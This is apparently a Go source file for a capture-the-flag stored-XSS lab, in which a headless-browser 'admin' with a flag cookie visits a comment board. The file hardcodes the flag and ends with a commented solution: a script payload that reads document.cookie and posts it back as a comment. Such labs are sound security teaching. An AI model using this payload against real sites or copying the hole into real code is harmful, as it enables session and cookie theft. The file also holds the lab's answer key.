package xss

import (
	"database/sql"
	"fmt"
	"io"
	"net/http"
	"sync"
	"time"

	"math/rand"

	"github.com/fingann/swat/public"
	"github.com/gin-gonic/gin"
	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/proto"
)
var Flag ="flag{try_the_admin_user}"
var sseChan = make(chan string)

func RegisterRoutes(r *gin.Engine) error {
	db,err:= SetupDb()
	if err != nil {
		return fmt.Errorf("failed to setup database: %w", err)
	}

	r.GET("/xss", func(c *gin.Context) {
			c.SetCookie("testFlag", "the admin might have a flag", 0, "/xss", "localhost", false, false)

			// Make sure the website is visited only once
			sync.OnceFunc(func(){
				go VisitWebsiteWithRod("http://localhost:8081/xss")
			})
		// Refresh the whole page if the header is not set
		if c.GetHeader("HX-Request") == "" {
			
			c.HTML(http.StatusOK, "", public.Base(Page()))
			return
		}

		c.HTML(http.StatusOK, "", Page() )
	})


	r.POST("/xss/comments/create", func(c *gin.Context) {
		user,_ := c.GetPostForm("user")
		comment,_ := c.GetPostForm("comment")
		if len(user) == 0 || len(comment) == 0 {
			c.AbortWithError(http.StatusBadRequest, fmt.Errorf("user and comment must be set"))
			return
		}
		if err:= CreateComment(db, comment, user); err != nil {
			// ignore and fetch comments
		}

		go MakeAdminVisit(c,db)


		c.Redirect(http.StatusFound, "/xss/comments")
	})

	r.GET("/xss/comments", func(c *gin.Context) {
		comments,err:= GetComments(db)
		if err != nil {
			c.HTML(http.StatusOK, "", CommentRows(nil))
			return
		}
		c.HTML(http.StatusOK, "", CommentRows(comments))
	})
    r.GET("/xss/sse", func(c *gin.Context) {
        c.Stream(func(w io.Writer) bool {
            c.Writer.Header().Set("Content-Type", "text/event-stream")
            c.Writer.Header().Set("Cache-Control", "no-cache")
            c.Writer.Header().Set("Connection", "keep-alive")
            c.Writer.Header().Set("Access-Control-Allow-Origin", "*")

            // Listen to message channel and send updates
            if msg, ok := <-sseChan; ok {
                c.SSEvent("update", msg)
				c.Writer.Flush()
                return true // continue streaming
            }
            return false // stop streaming if channel is closed
        })
    })


	return nil 
}


func MakeAdminVisit(c *gin.Context,db *sql.DB) {
	if IsAdminVisit(c) {
		return // If the flag is set this w as the admin user, do not trigger visit again
	}
	countBeforeVisit,err := GetCommentCount(db)
	if err != nil {
		return
	}

	VisitWebsiteWithRod("http://localhost:8081/xss")
	// If the comment count has increased, then admin was tricked into posting
	currentCount,err:= GetCommentCount(db)
	if err != nil {
		return
	}
	// If the count has not increased, then make a reply from the admin
	if  countBeforeVisit == currentCount {
		CreateComment(db, getRandomComment(), "admin")
	}
}

func IsAdminVisit(c *gin.Context) bool {
	flag,_:= c.Cookie("flag") 
	return flag == Flag
}


func VisitWebsiteWithRod(site string) {
	browser := rod.New().MustConnect()

	cookie := &proto.NetworkCookieParam{
		Name:  "flag",
		Value: Flag,
		URL:   site,
		HTTPOnly: false,
		Secure: false,
	}

	browser.SetCookies([]*proto.NetworkCookieParam{
		cookie})


	// Even you forget to close, rod will close it after main process ends.
	defer browser.MustClose()

	// Create a new page
	 page := browser.MustPage(site).MustWaitStable()
		_ =page
}


// adminComments holds a list of generic admin responses.
var adminComments = []string{
    "Takk for at du tok deg tid til å kommentere.",
    "Vi setter stor pris på din tilbakemelding.",
    "Interessant poeng, takk for at du delte.",
    "Takk for din innsikt.",
    "Din kommentar er mottatt med takk.",
    "Takk for at du deler dine tanker med oss.",
    "Din mening betyr mye for oss.",
    "Tusen takk for kommentaren!",
    "Alltid hyggelig med engasjerte lesere.",
    "Ditt bidrag er verdifullt, takk.",
    "Vi er takknemlige for din tilbakemelding.",
    "Din kommentar har blitt notert.",
    "Takk for at du engasjerer deg i diskusjonen.",
    "Enig, og takk for at du peker det ut.",
    "Interessant synspunkt, takk for at du delte det.",
    "Takk for din støtte.",
    "Din feedback er viktig for oss, takk.",
    "Takk for at du bidrar til samtalen.",
    "Takk for at du deler dine erfaringer med oss.",
    "Vi takker for din aktive deltagelse.",
}

// getRandomComment returns a random comment from the adminComments slice.
func getRandomComment() string {
    // Seed the random number generator to make results more unpredictable
    r := rand.New(rand.NewSource(time.Now().UnixNano()))
    // Generate a random index based on the length of the adminComments slice
    index := r.Intn(len(adminComments))
    // Return the comment at the randomly selected index
    return adminComments[index]
}


/* //Solution 
<script>
  const formData = new FormData();
  formData.append('user', 'user');
  formData.append('comment', JSON.stringify({cookies: document.cookie}));

  fetch('http://localhost:8081/xss/comments/create', {
    method: 'POST',
    body: formData
  });
</script> 
*/